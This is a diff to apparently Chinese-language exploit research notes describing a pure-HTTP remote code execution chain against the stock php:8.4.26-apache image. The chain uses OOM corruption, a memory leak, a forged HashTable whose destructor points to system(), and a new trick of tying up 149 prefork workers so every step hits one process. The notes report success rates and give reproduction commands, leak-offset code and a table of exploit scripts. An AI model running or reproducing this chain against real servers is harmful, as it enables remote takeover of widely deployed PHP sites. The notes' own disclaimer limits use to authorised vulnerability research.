@@ -1,8 +1,9 @@
 # 官方 128M / display_errors=Off 纯 HTTP 进展（2026-10-22，pure/）
 
-目标：官方 `php:8.4.26-apache`（trixie、`php.ini-production`、单 worker、
-`display_errors=Off`、`memory_limit=128M`、`output_buffering=4096`、files
-session handler）上的**纯 HTTP** 链：不挂 gdb、不读目标 `/proc`、不改配置。
+目标：官方 `php:8.4.26-apache`（trixie、`php.ini-production`、官方 prefork
+`MaxRequestWorkers=150`、`display_errors=Off`、`memory_limit=128M`、
+`output_buffering=4096`、files session handler）上的**纯 HTTP** 链：不挂
+gdb、不读目标 `/proc`、不改配置。
 
 本文只记录本轮在 `pure/` 下的独立实验，避免与 `de0/`、`tools/` 的其它
 工作冲突。
@@ -43,9 +44,10 @@ session handler）上的**纯 HTTP** 链：不挂 gdb、不读目标 `/proc`、�
    保留为别名）一条命令完成
    A1（OOM）→ B1（越界读，同时算 libphp + main chunk）→ A2
    （cheap-OOM）→ B2（fake-ref + 伪造 HashTable，`pDestructor=zif_system`）
-   → 目标内执行 `id`。加固后 **20/20**（带符号调试镜像 15 次 + 纯官方
-   `php:8.4.26-apache` 5 次），单次约 2 秒，worker 不重启，目标仍是
-   官方 `php.ini-production` (`display_errors=Off`, 128M)。
+   → 目标内执行 `id`。单 worker 基线 **20/20**；官方 worker
+   （`MaxRequestWorkers=150`，先占住 149 个 child）**10/10**，单次约
+   3–4 秒，被固定的 worker 不重启，目标仍是官方 `php.ini-production`
+   (`display_errors=Off`, 128M)。
 
 ## 1. chunked 绕过 post_max_size（证据）
 
@@ -294,11 +296,15 @@ zval；S 处的伪造 zend_array 的 `pDestructor` 是 `zif_system`，
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-- 加固后 **20/20**：带符号调试镜像上同一 worker 连续 8 次、每次
+- 单 worker 基线 **20/20**：带符号调试镜像上同一 worker 连续 8 次、每次
   `--restart` 的全新容器 7 次；另外在 **stock 官方镜像
   `php:8.4.26-apache`**（未装 gdb/符号，容器内只把官方
   `php.ini-production` 复制成 `php.ini`）上复测 5/5。每次约 2 秒，
-  worker pid 不变，目标配置未改。
+  被固定的 worker pid 不变，目标配置未改。
+- 官方 worker（stock MPM：`StartServers 5`、`MaxRequestWorkers 150`）
+  **10/10**：18110 上 4 次（3 次同容器 + 1 次 `--restart`），18112 上
+  6 次（1 次首跑 + 3 次同容器 + 2 次 `--restart`）；每次约 3–4 秒
+  （包含 149 个占位连接）。
 - 加固前有 1 次失败：那一次窗口里出现最多的 qword 不是 `zval_ptr_dtor`
   （推出来的 libphp 与 main 相差 0xCB80000）。现在靠上面的 delta
   检查直接丢弃这种泄漏并重试；失败重试不会复用已被 A2 破坏的 worker
@@ -306,14 +312,36 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - 全链只用 HTTP（chunked multipart + 普通 GET/POST），交付路径不挂
   gdb、不读目标 `/proc`、不改目标配置。
 
+### 6.5 从单 worker 到官方 worker（MaxRequestWorkers=150）
+
+官方镜像的 `mpm_prefork.conf` 是 `StartServers 5`、`MaxRequestWorkers 150`；
+A1/B1/A2/B2 如果落到不同 child，跨请求的悬空指针就不存在。纯 HTTP 的
+解决办法是**占满其它 child，只留一个**：
+
+```text
+1. 开 MaxRequestWorkers-1 = 149 个连接，每个只发 POST 头和 1 字节 body，
+   Content-Length: 1048576；prefork 会为每个连接分配一个 child 并在
+   read body 处阻塞（Timeout 默认 60s，链只需要 3–4s）。
+2. 剩下的唯一空闲 child 依次处理 warm GET、A1、B1、A2、B2；
+   每个请求结束后它又成为唯一空闲 child，所以四步必然落在同一个进程。
+3. 链结束后关闭 149 个连接，children 回到空闲状态。
+```
+
+实现：`exploit.py --workers 150`（默认值）。`--workers 1` 退回单 worker
+基线，`--workers N` 用于其它 `MaxRequestWorkers` 配置。注意不要多占：
+超过 N-1 个连接会排在 accept queue 里，A1 结束后它们会先抢走空闲 child，
+反而把 B1 挤到别的 child。官方默认值之外的环境需要显式给 N。
+
 ## 7. 复现命令（纯 HTTP，无 gdb）
 
 ```bash
 # 目标容器：stock 官方 php:8.4.26-apache + 官方 php.ini-production
 ./pure/run_pure.sh                     # 默认 p2s-pure-18110 / 18110
-                                       # （--dbg 才用带符号镜像，仅标定）
+                                       # 默认官方 prefork（150 workers）
+                                       # --single 单 worker；--dbg 带符号镜像
 
 # 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> system(cmd)
+# 默认 --workers 150（占住 149 个 child）；单 worker 基线用 --workers 1
 python3 exploit.py --port 18110
 # 期望最后两行：
 # [4/4] RCE OK; proof .../out/p1:
@@ -364,7 +392,7 @@ print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
 
 | 文件 | 用途 |
 |---|---|
-| `pure/run_pure.sh` | 起独立容器 `p2s-pure-18110`：默认 stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production`；`--dbg` 仅用于带符号镜像标定 |
+| `pure/run_pure.sh` | 起独立容器 `p2s-pure-18110`：默认 stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` + 官方 prefork（150 workers）；`--single` 单 worker；`--dbg` 带符号镜像 |
 | `pure/chunked_send.py` | chunked 发送 multipart body（绕过 post_max_size） |
 | `pure/mk_a1.py` | A1 body（OOM 形状；支持 query 由 `--path` 给） |
 | `pure/mk_leak_b.py` | B body：`A:<page>` 311-page forge、`G:<pages>:<page>` 全块 forge、`F/S` flood、`X:n` 数组字段 |
@@ -379,9 +407,11 @@ print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
 | 远端 `~/p2s-pure-1022/evidence/pwn_pure_batch_20261022.log` | 加固后 6 连击（3 同 worker + 3 全新容器）全链日志 |
 | `pure/evidence/pwn_pure_official_20261022.log` | stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` 上 3 连击全链日志 |
 | `pure/evidence/exploit_entry_20261022.log` | 根目录 `exploit.py` 与 `pure/pwn_pure.py` 别名各 1 次全链 |
+| `pure/evidence/official_workers_20261022.log` | 官方 worker（MaxRequestWorkers=150）上 4 连击全链日志 |
 
 ## 9. 约束与免责声明
 
 - 所有请求形状绑定官方 `php:8.4.26-apache`（trixie）构建、官方
-  `php.ini-production`、单 worker prefork；换构建/ini 需重新标定。
+  `php.ini-production`、官方 prefork worker（默认 `MaxRequestWorkers=150`，
+  其它值用 `--workers N`）；换构建/ini 需重新标定。
 - 仅用于授权环境的漏洞研究与复现。
